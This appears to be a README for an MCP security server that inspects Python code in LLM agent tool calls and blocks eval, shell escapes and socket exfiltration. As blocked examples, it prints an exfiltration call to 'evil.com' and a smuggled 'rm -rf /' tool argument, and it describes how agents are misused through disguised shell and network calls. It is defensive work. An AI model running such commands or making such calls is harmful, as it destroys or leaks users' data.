# AW-1 Circuit Breaker

[![Glama Score](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker/badges/score.svg)](https://glama.ai/mcp/servers/MvikManners/aw1-circuit-breaker)

Deterministic AST deconstruction and runtime circuit breaker preventing rogue shell escapes, dynamic eval(), and covert lateral socket egress in autonomous LLM tool calls.

## Installation

```bash
pip install -r requirements.txt
```

## Running the Server

Run directly with Python:
```bash
python mcp_server.py
```

Or via uvx:
```bash
uvx mcp_server.py
```

## MCP Client Configuration

```json
{
  "mcpServers": {
    "aw1-circuit-breaker": {
      "command": "python",
      "args": ["mcp_server.py"]
    }
  }
}
```

## Exploit Interception in Action

AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.

### Interception Matrix

| Attack Vector | Attacker Strategy | LLM Guardrail Result | AW-1 AST Circuit Breaker |
|---|---|---|---|
| **Dynamic Execution** | `eval(compile(...))` | Evades semantic filters | **Tripped (`RESTRICTED_INVOCATION`)** |
| **Shell Escapes** | `subprocess.Popen(['bash', ...])` | Masked as system task | **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |
| **Lateral Exfiltration** | `socket.connect(('evil.com', 443))` | Disguised as HTTP fetch | **Tripped (`UNAUTHORIZED_MODULE_IMPORT`)** |

### Run the Showcase

```bash
python examples/exploit_showcase.py
```

## Runtime Latency Telemetry

Deterministic security must not throttle agent execution. AW-1 operates with sub-millisecond AST parsing and microsecond-scale argument filtering across warm execution loops.

*Sample Size: 1,000 synthetic iterations per test vector on Debian Python 3.13.*

| Evaluation Target | p50 Latency | p95 Latency | p99 Latency | Status |
|---|---|---|---|---|
| **AST Inspection (Benign Payload)** | **0.0889 ms** | 0.1298 ms | 0.1645 ms | `< 0.2 ms` Overhead |
| **AST Inspection (Adversarial Exploit)** | **0.0520 ms** | 0.0919 ms | 0.1051 ms | Instant Breakout Halt |
| **Shell Argument Injection Guard** | **0.0051 ms** | 0.0096 ms | 0.0195 ms | Sub-20 µs Inspection |

Reproduce locally:
```bash
python benchmark.py
```

## Framework Integration (LangGraph Example)

AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:

```python
from examples.langgraph_adapter import execute_agent_action, CircuitBreakerException

# Guard autonomous agent tool dispatches
try:
    execute_agent_action(bash_tool, "bash_tool", {"cmd": "cat log.txt; rm -rf /"})
except CircuitBreakerException as blocked:
    print(f"Tool call halted: {blocked}")
```

## License

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0). See [LICENSE](LICENSE) for details.
